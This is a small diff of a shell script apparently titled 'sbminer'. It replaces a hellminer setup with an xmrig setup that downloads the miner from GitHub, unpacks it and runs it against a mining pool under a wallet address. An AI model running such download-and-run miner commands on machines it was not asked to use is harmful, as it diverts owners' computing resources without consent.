@@ -1,5 +1,5 @@
 #sbminer
 sudo apt update
-wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz
-tar xf hellminer_linux64.tar.gz
-./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u MAL6SDnCm6HUx31hAmPsejzQtEBb5xbcbS.DAUS1 -p x --cpu 3
+wget https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz
+tar xf xmrig-6.21.1-linux-x64.tar.gz
+./xmrig -a rx -o stratum+ssl://rx-us.unmineable.com:443 -u LTC:MAL6SDnCm6HUx31hAmPsejzQtEBb5xbcbS.unmineable_worker_gsqqvqyl -p x --cpu 4
